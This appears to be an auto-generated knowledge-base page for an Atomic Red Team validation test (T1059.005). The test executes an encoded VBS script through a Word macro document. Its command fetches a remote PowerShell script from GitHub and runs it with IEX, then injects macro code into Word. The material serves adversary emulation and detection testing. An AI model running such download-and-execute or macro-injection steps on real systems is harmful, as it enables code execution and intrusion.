---
atomic_guid: "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa"
title: "Encoded VBS code execution"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.005"
attack_technique_name: "Command and Scripting Interpreter: Visual Basic"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.yaml"
build_date: "2026-04-27 19:12:26"
executor: "powershell"
aliases:
  - "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa"
  - "Encoded VBS code execution"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution
a message box will pop up displaying "ART T1059.005"

A note regarding this module, due to the way that this module utilizes "ScriptControl" a 64bit version of Microsoft Office is required.
You can validate this by opening WinWord -> File -> Account -> About Word

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter#^t1059005-visual-basic|T1059.005: Visual Basic]]

## Dependencies

The 64-bit version of Microsoft Office must be installed

### Prerequisite Check

```powershell
try {
  $wdApp = New-Object -COMObject "Word.Application"
  $path = $wdApp.Path
  Stop-Process -Name "winword"
  if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
```

### Cleanup

```powershell
Get-WmiObject win32_process | Where-Object {$_.CommandLine -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.yaml)
